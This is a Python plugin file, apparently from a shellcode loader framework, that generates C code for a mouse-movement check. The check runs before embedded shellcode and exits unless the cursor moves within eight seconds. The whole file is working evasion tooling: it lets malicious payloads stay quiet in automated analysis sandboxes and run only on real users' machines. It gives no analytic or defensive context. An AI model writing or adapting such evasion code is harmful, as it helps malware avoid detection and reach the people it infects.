import random
import string

class mousemovement:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def transformer(self, shellcodestring: str) -> str:
        return f'{self.name}();\n\t' + shellcodestring

    def codeblock(self) -> str:

        return f"""
void {self.name}()
{{
    DWORD window_ms = 8000;
    DWORD sample_delay_ms = 250;
    POINT p0, p1;
    if (!GetCursorPos(&p0)) {{
        exit(0);
    }}

    DWORD elapsed = 0;
    while (elapsed < window_ms) {{
        Sleep(sample_delay_ms);
        elapsed += sample_delay_ms;

        if (!GetCursorPos(&p1)) {{
            exit(0);
        }}

        if (p1.x != p0.x || p1.y != p0.y) {{
            return;
        }}
    }}

    exit(0);
}}
"""